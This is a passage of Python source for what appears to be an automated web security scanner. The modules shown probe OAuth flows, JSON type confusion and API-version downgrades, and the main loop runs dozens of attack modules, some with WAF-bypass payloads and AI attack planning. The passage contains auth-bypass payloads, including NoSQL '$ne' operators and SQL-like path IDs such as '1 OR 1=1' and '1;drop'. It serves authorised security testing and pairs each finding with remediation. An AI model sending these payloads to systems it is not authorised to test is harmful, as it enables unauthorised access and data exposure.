            body = r.text.lower()
            # If server responds with a login form (not an error), PKCE is not mandatory
            if r.status_code == 200 and ("login" in body or "username" in body or "email" in body):
                yield _finding("oauth_advanced", "oauth_pkce_not_required", "medium",
                    "OAuth PKCE Not Required — Authorization Code Interception Risk",
                    "The authorization server accepted an OAuth flow without `code_challenge` "
                    "(PKCE). For public clients (SPAs, mobile apps), PKCE is required by RFC 9700 "
                    "to prevent authorization code interception attacks. Without PKCE, a malicious "
                    "app registered on the same device can steal the auth code from the redirect URI.",
                    f"URL: {no_pkce_url}\nServer presented login form without requiring PKCE",
                    no_pkce_url, True,
                    "Enforce PKCE (code_challenge + code_challenge_method=S256) for all public clients. "
                    "Reject authorization requests without code_challenge from public client_ids. "
                    "See RFC 7636 and RFC 9700.",
                    confidence="medium")
    except httpx.HTTPError:
        pass

    # ── Test 3: Scope escalation attempt ─────────────────────────────────────
    escalation_scopes = ["admin", "write:all", "read:all", "sudo", "openid profile email admin"]
    for scope in escalation_scopes[:3]:
        esc_url = (f"{oauth_base}?response_type=code&client_id=test"
                   f"&redirect_uri={origin}/callback&scope={scope}&state=xyz")
        yield _probe("oauth_advanced", "GET", esc_url, payload=f"scope={scope}",
                     note="scope escalation attempt")
        try:
            r = await client.get(esc_url, timeout=8, follow_redirects=False)
            yield _probe("oauth_advanced", "GET", esc_url, status=r.status_code, size=len(r.content))
            if r.status_code in (200, 302) and "error" not in r.text.lower()[:200]:
                yield _finding("oauth_advanced", "oauth_scope_escalation", "high",
                    f"OAuth Scope Escalation — '{scope}' Scope Not Rejected",
                    f"The authorization server accepted a request for elevated scope `{scope}` "
                    f"without returning an error. Depending on the authorization server's behaviour, "
                    f"this could allow an attacker to obtain tokens with broader permissions than "
                    f"intended, potentially including admin or write access.",
                    f"URL: {esc_url}\nRequested scope: {scope}\nResponse: {r.status_code}",
                    esc_url, True,
                    "Validate all requested scopes against the client's pre-registered allowed scopes. "
                    "Return `invalid_scope` error for any unauthorized scope request. "
                    "Never grant more permissions than the client is registered to request.",
                    confidence="medium")
                break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Test 4: Client secret / token in JavaScript ───────────────────────────
    try:
        r = await client.get(target, timeout=8)
        # Look for OAuth client secrets or access tokens hardcoded in JS
        oauth_secret_patterns = [
            r'client_secret\s*[:=]\s*["\']([^"\']{10,})["\']',
            r'clientSecret\s*[:=]\s*["\']([^"\']{10,})["\']',
            r'access_token\s*[:=]\s*["\']([A-Za-z0-9\-_\.]{20,})["\']',
            r'"client_secret"\s*:\s*"([^"]{10,})"',
        ]
        for pat in oauth_secret_patterns:
            m = re.search(pat, r.text, re.IGNORECASE)
            if m:
                val = m.group(1)
                # Don't flag obviously templated or placeholder values
                if not any(p in val.lower() for p in ["your_", "example", "placeholder", "xxx"]):
                    yield _finding("oauth_advanced", "oauth_client_secret_in_js", "critical",
                        "OAuth Client Secret / Access Token Hardcoded in Frontend JavaScript",
                        f"A potential OAuth client_secret or access_token was found hardcoded in the "
                        f"page source: `{val[:30]}...`. Client secrets must never be embedded in "
                        f"frontend JavaScript — they are visible to any user who views source.",
                        f"Pattern matched: {pat}\nValue (truncated): {val[:40]}",
                        target, True,
                        "Move all OAuth secrets to the server side. "
                        "Use the Authorization Code flow with PKCE for SPAs (no client_secret needed). "
                        "Rotate the exposed secret immediately.",
                        confidence="high")
                    break
    except httpx.HTTPError:
        pass


# ── Module: JSON Type Confusion ───────────────────────────────────────────────

async def _module_type_confusion(target: str, client: httpx.AsyncClient,
                                  forms: list[dict]) -> AsyncGenerator[dict, None]:
    """
    JSON type juggling / type confusion attacks:
    - Array injection bypassing string equality checks
    - Null coercion bypassing presence checks
    - Integer vs string coercion in auth flows
    - Object injection in JSON POST bodies

    Common in Node.js (loose == comparisons), PHP (strcmp returns 0 for non-string),
    and Ruby (JSON.parse returns different types from expected).
    """
    # Endpoints that commonly receive JSON with auth/id fields
    auth_endpoints = [
        "/api/login", "/api/auth/login", "/auth/login", "/login",
        "/api/users", "/api/me", "/api/profile",
        "/api/admin", "/api/v1/login", "/api/v2/login",
    ]

    # ── Test 1: Array injection in login ─────────────────────────────────────
    # PHP strcmp(password, ['x']) = null which coerces to 0 (true in loose comparison)
    # Node.js: "admin" == ["admin"] is false, but some ORMs handle arrays as IN queries
    array_payloads = [
        {"username": "admin", "password": ["x"]},
        {"username": ["admin"], "password": "x"},
        {"email": ["admin@example.com"], "password": "x"},
        {"email": "admin@example.com", "password": {"$ne": ""}},  # NoSQL + type confusion combo
    ]

    for ep in auth_endpoints[:5]:
        url = target + ep
        yield _probe("type_confusion", "POST", url, note="array/object type injection in auth body")
        for payload_dict in array_payloads[:2]:
            try:
                r = await client.post(url, json=payload_dict, timeout=8)
                yield _probe("type_confusion", "POST", url, status=r.status_code,
                             size=len(r.content), payload=str(payload_dict)[:60])
                # Success signals: token in response, redirect to dashboard, 200 with user data
                if r.status_code in (200, 201):
                    body_lower = r.text.lower()
                    if any(kw in body_lower for kw in
                           ["token", "access_token", "dashboard", "welcome", "user", "profile"]):
                        yield _finding("type_confusion", "array_injection_auth_bypass", "critical",
                            "JSON Type Confusion — Array Injection Bypasses Authentication",
                            f"Sending `password` as an array `{payload_dict.get('password')}` "
                            f"to `{ep}` returned {r.status_code} with authentication success signals. "
                            f"In PHP, `strcmp(password, [])` returns NULL which loose-equals 0 (truthy). "
                            f"In some ORMs, an array is treated as an IN query, matching any user.",
                            f"URL: {url}\nPayload: {payload_dict}\nResponse: {r.status_code}\n"
                            f"Body: {r.text[:300]}",
                            url, True,
                            "Use strict type checking (=== in PHP, strict comparison in JS). "
                            "Validate all input types before passing to authentication functions. "
                            "Use parameterized queries — never concatenate user input into auth logic.",
                            confidence="high")
                        break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Test 2: Null / empty type coercion in JSON ─────────────────────────────
    # Some apps check `if (user.role)` — null, false, 0 can bypass presence check
    api_endpoints = ["/api/users/me", "/api/profile", "/api/admin/users"]
    for ep in api_endpoints[:3]:
        url = target + ep
        for null_payload in [{"role": None}, {"admin": None}, {"is_admin": None}]:
            try:
                r_normal = await client.get(url, timeout=6)
                r_null   = await client.patch(url, json=null_payload, timeout=6)
                yield _probe("type_confusion", "PATCH", url, status=r_null.status_code,
                             payload=str(null_payload), note="null coercion in role field")
                if r_null.status_code in (200, 204):
                    yield _finding("type_confusion", "null_role_coercion", "high",
                        f"JSON Null Coercion — Role/Admin Field Set to null Accepted",
                        f"PATCH `{ep}` with `{null_payload}` returned {r_null.status_code}. "
                        f"If the server stores null for role and then checks `if user.role` (truthy check), "
                        f"the user could gain or lose permissions unexpectedly. "
                        f"Some implementations treat null role as a superuser (no restrictions applied).",
                        f"URL: {url}\nPayload: {null_payload}\nResponse: {r_null.status_code}",
                        url, True,
                        "Use strict type validation for all role/permission fields. "
                        "Never use truthy checks for authorization — compare against explicit allowed values. "
                        "Reject requests that set role/admin/permission fields to null.",
                        confidence="medium")
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Test 3: Integer user ID as string vs integer ──────────────────────────
    # Loose comparison: "1" == 1 in PHP, causing "user_id: '1admin'" to match user 1
    string_id_payloads = ["1 OR 1=1", "1e0", "01", "1.0", "1;drop"]
    for ep_pattern in ["/api/users/{id}", "/api/profile/{id}", "/api/orders/{id}"]:
        for sid in string_id_payloads[:2]:
            ep = ep_pattern.replace("{id}", sid)
            url = target + ep
            yield _probe("type_confusion", "GET", url, payload=sid,
                         note="string/integer type confusion in path param")
            try:
                r = await client.get(url, timeout=6)
                yield _probe("type_confusion", "GET", url, status=r.status_code, size=len(r.content))
                if r.status_code == 200 and len(r.content) > 50:
                    yield _finding("type_confusion", "integer_string_confusion", "medium",
                        f"Possible Integer/String Type Confusion in Path Parameter",
                        f"GET `{url}` with non-integer ID `{sid}` returned 200 ({len(r.content)}b). "
                        f"In PHP, loose comparison `$id == '01'` is true for integer 1. "
                        f"In JavaScript, `'1e0' == 1` evaluates to true. "
                        f"This may allow unauthorized resource access or data corruption.",
                        f"URL: {url}\nID type: string '{sid}'\nResponse: 200 ({len(r.content)}b)",
                        url, True,
                        "Cast all ID parameters to the expected type before use. "
                        "Use === (strict equality) in JavaScript and cast to int in PHP. "
                        "Validate IDs match the expected format (UUID, integer) before querying.",
                        confidence="medium")
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


# ── Module: API Version Downgrade ─────────────────────────────────────────────

async def _module_api_versioning(target: str, client: httpx.AsyncClient,
                                  endpoints: set[str]) -> AsyncGenerator[dict, None]:
    """
    API versioning security issues:
    - Older API versions with relaxed authentication
    - Missing authorization on deprecated version endpoints
    - Version enumeration via Accept header, URL path, query param
    - Different behavior between v1 and v2 (auth bypass via downgrade)
    """
    parsed = urlparse(target)

    # Detect current API version from crawled endpoints or common patterns
    current_versions: list[str] = []
    for ep in list(endpoints)[:50]:
        m = re.search(r'/v(\d+)/', ep)
        if m:
            ver = m.group(1)
            if ver not in current_versions:
                current_versions.append(ver)

    # Generate versions to probe: if current is v2, probe v1; if v3, probe v1+v2
    versions_to_test = [str(v) for v in range(1, 5)]

    # ── Test 1: Probe alternative API version prefixes ──────────────────────
    version_prefixes = []
    for v in versions_to_test:
        version_prefixes.extend([
            f"/api/v{v}/", f"/v{v}/", f"/api/{v}/",
        ])

    discovered_versions: list[str] = []
    for prefix in version_prefixes[:12]:
        url = target + prefix.rstrip("/")
        yield _probe("api_versioning", "GET", url, note=f"probing API version endpoint: {prefix}")
        try:
            r = await client.get(url, timeout=6)
            yield _probe("api_versioning", "GET", url, status=r.status_code, size=len(r.content))
            if r.status_code not in (404, 400, 410):
                discovered_versions.append(prefix)
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    if len(discovered_versions) > 1:
        yield _finding("api_versioning", "multiple_api_versions_active", "medium",
            "Multiple API Versions Active — Attack Surface Increased",
            f"Multiple API version prefixes returned non-404 responses: {discovered_versions}. "
            f"Older versions often have weaker security controls, missing authentication, "
            f"or lack rate limiting applied to newer versions. This significantly expands "
            f"the attack surface for authentication bypass and privilege escalation.",
            f"Active versions found: {discovered_versions}",
            target, False,
            "Decommission all unused API versions. Enforce identical security controls "
            "across all active versions. Add deprecation warnings and sunset dates.",
            confidence="high")

    # ── Test 2: Auth bypass via version downgrade ─────────────────────────────
    # Check if an authenticated endpoint on v2 is accessible without auth on v1
    protected_paths = [
        "users", "profile", "me", "admin", "settings",
        "accounts", "dashboard", "orders",
    ]
    for prefix in discovered_versions[:3]:
        for path in protected_paths[:5]:
            url_auth   = f"{target}{prefix}{path}"
            yield _probe("api_versioning", "GET", url_auth, note="auth check on this version")
            try:
                # Test without auth header (strip Authorization)
                r_no_auth = await client.get(
                    url_auth,
                    headers={k: v for k, v in client.headers.items()
                              if k.lower() not in ("authorization", "cookie")},
                    timeout=6
                )
                yield _probe("api_versioning", "GET", url_auth,
                             status=r_no_auth.status_code, size=len(r_no_auth.content))
                if (r_no_auth.status_code == 200 and len(r_no_auth.content) > 100
                        and "application/json" in r_no_auth.headers.get("content-type", "")):
                    yield _finding("api_versioning", "auth_bypass_old_version", "critical",
                        f"Auth Bypass — Unauthenticated Access to `{prefix}{path}`",
                        f"The endpoint `{url_auth}` returned 200 with JSON data when called "
                        f"without an Authorization header. Older API versions frequently lack "
                        f"authentication middleware that was added in later versions. "
                        f"This is a critical finding: full data access without credentials.",
                        f"URL: {url_auth}\nNo-auth response: {r_no_auth.status_code} "
                        f"({len(r_no_auth.content)}b JSON)\nSnippet: {r_no_auth.text[:300]}",
                        url_auth, True,
                        "Apply authentication middleware to ALL API versions, not just the latest. "
                        "Decommission or restrict deprecated versions behind feature flags. "
                        "Audit every endpoint across every active version for auth gaps.",
                        confidence="high")
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Test 3: Version enumeration via Accept header ─────────────────────────
    # Some APIs version via `Accept: application/vnd.company.v1+json`
    if endpoints:
        test_ep = next(iter(endpoints))
        for v_header in ["application/vnd.api.v1+json", "application/vnd.api.v2+json",
                         "application/json; version=1", "application/json; version=2"]:
            try:
                r = await client.get(test_ep, headers={"Accept": v_header}, timeout=6)
                yield _probe("api_versioning", "GET", test_ep, payload=f"Accept: {v_header}",
                             status=r.status_code, size=len(r.content))
                if r.status_code == 200 and "version" in r.headers.get("content-type", "").lower():
                    yield _finding("api_versioning", "header_based_versioning", "info",
                        "Header-Based API Versioning Detected",
                        f"The API supports version negotiation via the Accept header "
                        f"(`{v_header}` → {r.status_code}). Header-based versioning should be "
                        f"tested for version-specific security control gaps.",
                        f"Accept header: {v_header}\nResponse: {r.status_code}",
                        test_ep, False,
                        "Ensure all security controls (auth, rate limiting, input validation) "
                        "are version-agnostic and applied uniformly.",
                        confidence="medium")
                    break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)


def _adapt_attack_suite_findings(findings: list[dict]) -> list[dict]:
    """Normalize classic Attack Suite findings (from `_finding()`) for
    finding_ingest.ingest_findings.

    Each finding already carries a specific, per-check remediation string
    written inline at the point of detection (e.g. "HTML-encode all
    user-supplied input..." for reflected XSS) — that's real, non-generic
    guidance and takes priority. `get_remediation()` is only a defensive
    fallback for the rare case a finding somehow has no remediation text
    (e.g. a future module that forgets to pass one).

    `is_vulnerable=False` entries (informational probes like
    "header_based_versioning") are still forwarded — ingest_findings itself
    drops anything with severity="info", which covers nearly all of them.
    """
    from app.core.finding_confidence import grade_confidence

    adapted = []
    for f in findings:
        module = f.get("module", "attack_suite")
        title = f.get("title", "Untitled finding")
        remediation = f.get("remediation") or get_remediation(category=f"attack-suite-{module}", title=title)
        description = f.get("description", "")
        ai_note = f.get("ai_analysis")
        if ai_note:
            description = f"{description}\n\nAI deep-analysis: {ai_note}"
        oracle = f.get("oracle")
        # Server-side false-positive gate: when a call site reports an
        # honest oracle, its confidence is COMPUTED from that, not accepted
        # as whatever literal string the call site passed — same doctrine
        # already enforced for the Attack Suite AI Agent. Call sites that
        # haven't been migrated to report an oracle yet keep their existing
        # literal confidence, unchanged.
        confidence = grade_confidence(oracle) if oracle else f.get("confidence", "medium")
        adapted.append({
            "title": title,
            "description": description,
            "severity": f.get("severity", "info"),
            "category": f"attack-suite-{module}",
            "affected_asset": f.get("url", ""),
            "evidence": {
                "raw": f.get("evidence", ""),
                "test_name": f.get("test_name"),
                "module": module,
                "is_vulnerable": f.get("is_vulnerable", False),
                "ai_analysis": ai_note,
                "oracle": oracle,
            },
            "remediation": remediation,
            "confidence": confidence,
        })
    return adapted


# ── Main Stream ───────────────────────────────────────────────────────────────

async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest, org_id: UUID,
                                db: AsyncSession | None = None,
                                ai_config: dict | None = None) -> AsyncGenerator[str, None]:
    start_time = time.monotonic()
    findings: list[dict] = []
    counts: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}

    yield _sse("start", {
        "scan_id": scan_id, "target": req.target,
        "modules": req.modules, "timestamp": datetime.now(timezone.utc).isoformat(),
    })

    _scan_history[scan_id] = {
        "id": scan_id, "target": req.target, "modules": req.modules,
        "status": "running", "started_at": datetime.now(timezone.utc).isoformat(),
        "findings": [], "counts": counts, "crawl": {}, "org_id": str(org_id),
    }

    def emit(f: dict):
        findings.append(f)
        sev = f.get("severity", "info").lower()
        counts[sev] = counts.get(sev, 0) + 1
        _scan_history[scan_id]["findings"] = findings
        _scan_history[scan_id]["counts"] = counts

    headers = dict(req.auth_headers)
    headers.setdefault("User-Agent", "AttackTrace-Security-Scanner/2.0")

    # Short connect timeout ensures unreachable targets fail fast
    _timeout = httpx.Timeout(connect=4.0, read=float(req.timeout),
                              write=float(req.timeout), pool=5.0)

    async with httpx.AsyncClient(headers=headers, timeout=_timeout,
                                  follow_redirects=req.follow_redirects,
                                  verify=False) as client:

        # ── Login ──────────────────────────────────────────────────────────
        auth_headers: dict[str, str] = {}
        if req.login.enabled:
            yield _sse("progress", {"message": "🔐 Performing login...", "module": "login"})
            try:
                auth_result = await _perform_login(client, req.login, req.target)

                # Emit debug trace first so user can see what the parser found
                for dbg_msg in auth_result.pop("__login_debug__", []):
                    yield _sse("progress", {"message": f"  [login] {dbg_msg}", "module": "login"})

                # Strip __cookie_header__ — we use client.cookies directly
                auth_result.pop("__cookie_header__", None)

                auth_headers = auth_result

                if "__cookies__" in auth_headers:
                    for ck_name, ck_val in auth_headers.pop("__cookies__").items():
                        client.cookies.set(ck_name, ck_val)
                    if auth_headers:
                        client.headers.update(auth_headers)
                    yield _sse("progress", {
                        "message": "✅ Login successful — session cookies applied",
                        "module": "login"
                    })
                elif auth_headers:
                    client.headers.update(auth_headers)
                    auth_type = next(iter(auth_headers), "unknown")
                    yield _sse("progress", {
                        "message": f"✅ Login successful — auth type: {auth_type}",
                        "module": "login"
                    })
                else:
                    yield _sse("progress", {"message": "⚠️ Login attempted but no session captured — scan will run unauthenticated", "module": "login"})
            except Exception as e:
                yield _sse("progress", {"message": f"Login error: {e}", "module": "login"})

        # ── Second account client ──────────────────────────────────────────
        client2: Optional[httpx.AsyncClient] = None
        if req.account2.enabled:
            acc2_headers: dict[str, str] = {}
            if req.account2.bearer_token:
                acc2_headers["Authorization"] = f"Bearer {req.account2.bearer_token}"
            elif req.account2.cookie:
                acc2_headers["Cookie"] = req.account2.cookie
            elif req.account2.login_type == "rest_json" and req.account2.login_url and req.account2.username:
                # REST JSON login for second account
                try:
                    acc2_cfg = LoginConfig(
                        enabled=True,
                        login_url=req.account2.login_url,
                        username=req.account2.username,
                        password=req.account2.password,
                        login_type="rest_json",
                        token_path=req.account2.token_path,
                    )
                    acc2_auth = await _perform_login(client, acc2_cfg, req.target)
                    for dbg_msg in acc2_auth.pop("__login_debug__", []):
                        yield _sse("progress", {"message": f"  [acct2] {dbg_msg}", "module": "login"})
                    acc2_auth.pop("__cookie_header__", None)
                    if acc2_auth:
                        acc2_headers.update(acc2_auth)
                        yield _sse("progress", {
                            "message": "✅ Account 2 login successful (REST JSON).",
                            "module": "login"
                        })
                    else:
                        yield _sse("progress", {"message": "⚠️ Account 2 login failed — no token returned.", "module": "login"})
                except Exception as e:
                    yield _sse("progress", {"message": f"Account 2 login error: {e}", "module": "login"})
            elif req.account2.login_type == "form" and req.account2.login_url and req.account2.username:
                try:
                    acc2_cfg = LoginConfig(
                        enabled=True,
                        login_url=req.account2.login_url,
                        username=req.account2.username,
                        password=req.account2.password,
                        login_type="form",
                    )
                    acc2_auth = await _perform_login(client, acc2_cfg, req.target)
                    for dbg_msg in acc2_auth.pop("__login_debug__", []):
                        yield _sse("progress", {"message": f"  [acct2] {dbg_msg}", "module": "login"})
                    acc2_auth.pop("__cookie_header__", None)
                    if acc2_auth:
                        acc2_headers.update(acc2_auth)
                except Exception:
                    pass

            if acc2_headers:
                client2 = httpx.AsyncClient(headers={**headers, **acc2_headers},
                                             timeout=_timeout, verify=False)

        # ── Connectivity probe ─────────────────────────────────────────────
        _probe_timeout = httpx.Timeout(connect=4.0, read=5.0, write=5.0, pool=5.0)
        try:
            await client.head(req.target, timeout=_probe_timeout)
        except (httpx.ConnectError, httpx.ConnectTimeout):
            yield _sse("error", {"message": f"Target {req.target} is unreachable. Check the URL and try again."})
            return
        except Exception:
            # HEAD rejected (405, timeout on read, etc.) — fall back to GET
            try:
                await client.get(req.target, timeout=_probe_timeout)
            except (httpx.ConnectError, httpx.ConnectTimeout):
                yield _sse("error", {"message": f"Target {req.target} is unreachable. Check the URL and try again."})
                return
            except Exception:
                pass  # non-connect errors (SSL, redirect loops) — let the scan proceed

        # ── SPA Detection ──────────────────────────────────────────────────
        spa_fallback_size = await _detect_spa_fallback(req.target, client)
        if spa_fallback_size > 0:
            yield _sse("progress", {
                "message": f"⚠️ SPA detected (catch-all routing, fallback size={spa_fallback_size}b). "
                           f"Path-based tests will filter false positives automatically.",
                "module": "spa_detection"
            })

        # ── WAF Detection ──────────────────────────────────────────────────
        yield _sse("progress", {"message": "🛡️ Detecting WAF...", "module": "waf"})
        waf_info = await detect_waf(req.target)
        yield _sse("waf_detected", waf_info)
        if waf_info["detected"]:
            yield _sse("progress", {
                "message": f"🛡️ WAF detected: {waf_info['vendor'] or 'Unknown'} (confidence: {waf_info['confidence']}). "
                           f"Enabling bypass payloads for XSS and SQLi.",
                "module": "waf"
            })
        else:
            yield _sse("progress", {
                "message": "🛡️ No WAF detected.",
                "module": "waf"
            })

        # ── Crawl ──────────────────────────────────────────────────────────
        crawl_result = CrawlResult()
        if "crawl" in req.modules and req.crawler.enabled:
            yield _sse("progress", {
                "message": f"🕷️ Starting crawler (max depth={req.crawler.max_depth}, "
                           f"max pages={req.crawler.max_pages})...",
                "module": "crawl"
            })
            try:
                crawl_result = await _crawl(req.target, client, req.crawler)
                yield _sse("crawl_complete", {
                    "pages": len(crawl_result.pages),
                    "forms": len(crawl_result.forms),
                    "endpoints": len(crawl_result.endpoints),
                    "tech_stack": crawl_result.tech_stack,
                    "ids_found": len(crawl_result.ids_found),
                })
                yield _sse("progress", {
                    "message": f"✅ Crawl complete: {len(crawl_result.pages)} pages, "
                               f"{len(crawl_result.forms)} forms, "
                               f"{len(crawl_result.endpoints)} endpoints. "
                               f"Tech: {', '.join(crawl_result.tech_stack) or 'unknown'}",
                    "module": "crawl"
                })
                # Emit discovered URLs as probe events so user can see what was found
                for ep in sorted(crawl_result.endpoints)[:30]:
                    yield _sse("progress", {"message": f"  [crawl] endpoint: {ep}", "module": "crawl"})
                for fm in crawl_result.forms[:10]:
                    action = fm.get("action", "?")
                    method = fm.get("method", "GET")
                    fields = fm.get("inputs", [])
                    yield _sse("progress", {
                        "message": f"  [crawl] form: {method} {action} — fields: {', '.join(fields[:6]) or '(none)'}",
                        "module": "crawl"
                    })
                _scan_history[scan_id]["crawl"] = {
                    "pages": len(crawl_result.pages),
                    "forms": len(crawl_result.forms),
                    "endpoints": list(crawl_result.endpoints)[:50],
                    "tech_stack": crawl_result.tech_stack,
                }
            except Exception as e:
                yield _sse("progress", {"message": f"Crawler error: {e}", "module": "crawl"})

        # ── JS Source/Sink Analysis — feed into XSS targeting ─────────────
        # Run a quick JS probe on the main page to extract tainted parameters
        # from source→sink chains discovered in inline scripts.
        # These become priority XSS parameters (tested first, with canary correlation).
        js_tainted_params: list[str] = []
        if "xss" in req.modules:
            yield _sse("progress", {"message": "🔍 JS source/sink analysis for targeted XSS...", "module": "js_analysis"})
            try:
                main_r = await client.get(req.target, timeout=10)
                # Extract tainted params from inline script blocks
                js_sinks = _extract_js_sinks_from_body(main_r.text)

                # Also extract URL param names from location.search references
                import re as _re_js
                search_params = _re_js.findall(
                    r'(?:searchParams\.get|URLSearchParams|location\.search|getParam)\s*\(\s*["\']([^"\']+)["\']',
                    main_r.text
                )
                js_tainted_params = list(set(search_params))[:8]

                if js_sinks or js_tainted_params:
                    yield _sse("progress", {
                        "message": f"⚡ JS analysis: {len(js_sinks)} sink(s) in script blocks, "
                                   f"{len(js_tainted_params)} tainted param(s) identified "
                                   f"({', '.join(js_tainted_params[:4])}). Prioritising for XSS.",
                        "module": "js_analysis"
                    })
            except Exception:
                pass

        # ── AI Strategy Planning ───────────────────────────────────────────
        _resolved_cfg = ai_config or {}
        # A Qwen setup legitimately has no api_key (self-hosted servers often need
        # none) — gating on api_key alone silently skipped AI analysis for every
        # Qwen-configured org and misreported it as "no ANTHROPIC_API_KEY set"
        # even though the org's real provider was fully configured and working.
        _org_ai_ready = bool(_resolved_cfg.get("api_key")) or (
            _resolved_cfg.get("provider") == "qwen" and bool(_resolved_cfg.get("base_url"))
        )
        _ai_key = req.anthropic_api_key or settings.ANTHROPIC_API_KEY  # legacy per-scan override / global fallback
        if req.ai_analysis and (_org_ai_ready or _ai_key):
            yield _sse("progress", {"message": "🤖 AI analyzing target with hunt skill context...", "module": "ai"})
            try:
                plan = await _ai_plan_attack(
                    req.target, crawl_result.tech_stack,
                    list(crawl_result.endpoints)[:30], req.modules,
                    ai_config=_resolved_cfg if _org_ai_ready else {"provider": "anthropic", "api_key": _ai_key},
                )
                if plan:
                    yield _sse("ai_plan", {"plan": plan, "tech_stack": crawl_result.tech_stack})
                    yield _sse("progress", {"message": f"🤖 AI Strategy ready ({len(plan)} chars)", "module": "ai"})
            except Exception as e:
                yield _sse("progress", {"message": f"AI planning skipped: {e}", "module": "ai"})
        elif req.ai_analysis and not (_org_ai_ready or _ai_key):
            yield _sse("progress", {"message": "⚠️ AI analysis enabled but no AI provider configured — skipping", "module": "ai"})

        # ── Run modules ────────────────────────────────────────────────────
        # Collect WAF-specific bypass payloads for relevant modules
        _waf_xss_extra = get_waf_bypass_payloads(waf_info.get("vendor"), "xss")
        _waf_sqli_extra = get_waf_bypass_payloads(waf_info.get("vendor"), "sqli")

        module_runners = {
            "headers":   lambda: _module_headers(req.target, client),
            "cors":      lambda: _module_cors(req.target, client),
            "csrf":      lambda: _module_csrf(req.target, client, crawl_result.forms),
            "xss":       lambda _x=_waf_xss_extra, _j=js_tainted_params: _module_xss(req.target, client, crawl_result.forms, _x, _j),
            "sqli":      lambda _s=_waf_sqli_extra: _module_sqli(req.target, client, crawl_result.forms, _s),
            "ssrf":      lambda: _module_ssrf(req.target, client),
            "idor":      lambda: _module_idor(req.target, client, client2,
                                               crawl_result.endpoints, crawl_result.ids_found,
                                               spa_fallback_size),
            "privilege": lambda: _module_privilege(req.target, client, crawl_result.forms,
                                                    spa_fallback_size),
            "account":   lambda: _module_account_takeover(req.target, client, spa_fallback_size),
            "cache":     lambda: _module_cache(req.target, client),
            "race":      lambda: _module_race(req.target, client),
            "business":  lambda: _module_business(req.target, client, crawl_result.forms),
            "graphql":   lambda: _module_graphql(req.target, client),
            "jwt":       lambda: _module_jwt(req.target, client, {**req.auth_headers, **auth_headers}),
            "redirect":  lambda: _module_redirect(req.target, client),
            "auth_bypass": lambda: _module_auth_bypass(req.target, client, spa_fallback_size),
            "takeover":  lambda: _module_takeover(req.target, client),
            "nosql":        lambda: _module_nosql(req.target, client, crawl_result.forms),
            "ssti":         lambda: _module_ssti(req.target, client, crawl_result.forms),
            "xxe":          lambda: _module_xxe(req.target, client),
            "file_upload":  lambda: _module_file_upload(req.target, client, spa_fallback_size),
            "broken_auth":  lambda: _module_broken_auth(req.target, client),
            "info_disclosure": lambda: _module_info_disclosure(req.target, client, spa_fallback_size),
            "deserialization": lambda: _module_deserialization(req.target, client, crawl_result.forms),
            "rate_limit":  lambda: _module_rate_limit(req.target, client),
            "session":     lambda: _module_session(req.target, client),
            "http_method": lambda: _module_http_method(req.target, client, crawl_result.endpoints, spa_fallback_size),
            "2fa_bypass":  lambda: _module_2fa_bypass(req.target, client),
            "oauth":       lambda: _module_oauth(req.target, client),
            # Hunt-skill modules
            "smuggling":   lambda: _module_smuggling(req.target, client),
            "crlf":        lambda: _module_crlf(req.target, client),
            "hpp":         lambda: _module_hpp(req.target, client, crawl_result.endpoints),
            "saml":        lambda: _module_saml(req.target, client),
            "websocket":   lambda: _module_websocket(req.target, client),
            # Principal engineer additions
            "host_header":    lambda: _module_host_header(req.target, client),
            "path_traversal": lambda: _module_path_traversal(req.target, client, crawl_result.endpoints),
            "oauth_advanced": lambda: _module_oauth_advanced(req.target, client),
            "type_confusion": lambda: _module_type_confusion(req.target, client, crawl_result.forms),
            "api_versioning": lambda: _module_api_versioning(req.target, client, crawl_result.endpoints),
        }

        for mod_id in req.modules:
            if mod_id == "crawl" or mod_id not in module_runners:
                continue
            meta = next((m for m in MODULES_META if m["id"] == mod_id), {"label": mod_id})
            yield _sse("progress", {"message": f"[{mod_id}] ► Running: {meta['label']}...", "module": mod_id})
            try:
                async for finding in module_runners[mod_id]():
                    # Verbose HTTP probe trace — route to progress, not finding
                    if finding.get("__type__") == "probe":
                        yield _sse("progress", {
                            "message": finding["message"],
                            "module": finding.get("module", mod_id),
                        })
                        await asyncio.sleep(0)
                        continue
                    # AI deep-analysis for critical/high findings when a provider is available
                    if (_org_ai_ready or _ai_key) and finding.get("is_vulnerable") and finding.get("severity") in ("critical", "high"):
                        try:
                            ai_note = await _ai_analyze_finding(
                                finding, req.target,
                                ai_config=_resolved_cfg if _org_ai_ready else {"provider": "anthropic", "api_key": _ai_key},
                            )
                            if ai_note:
                                finding["ai_analysis"] = ai_note
                        except Exception:
                            pass
                    emit(finding)
                    yield _sse("finding", finding)
                    await asyncio.sleep(0)
            except Exception as e:
                yield _sse("progress", {"message": f"Module {mod_id} error: {e}", "module": mod_id})
            yield _sse("progress", {"message": f"[{mod_id}] ✓ {meta['label']} done.", "module": mod_id})

        if client2:
            await client2.aclose()

    duration = round(time.monotonic() - start_time, 1)
    _scan_history[scan_id].update({
        "status": "completed",
        "completed_at": datetime.now(timezone.utc).isoformat(),
        "findings": findings, "counts": counts, "duration_seconds": duration,
    })

    # Land results in the shared Finding table so they show up in the main
    # Findings list, Dashboard risk score, and reports — this scanner used to
    # only ever live in the in-memory _scan_history dict.
    if db is not None and findings:
        try:
            adapted = _adapt_attack_suite_findings(findings)
            await ingest_findings(db, org_id, source="attack_suite", source_scan_id=scan_id, findings=adapted)
            await db.commit()
            await invalidate_dashboard_cache(org_id)
        except Exception as e:
            await db.rollback()
            yield _sse("progress", {"message": f"Warning: failed to persist findings to database: {e}", "module": "ingest"})

    yield _sse("complete", {
        "scan_id": scan_id, "total_findings": len(findings),
        "counts": counts, "duration_seconds": duration,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "waf_info": waf_info,
    })


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.post("/test-auth")
async def test_auth_connection(
    payload: AttackSuiteRequest,
    current_user: Annotated[User, Depends(require_tool("attack_suite"))],
) -> dict:
    """Test target connectivity and authentication without running any attack modules."""
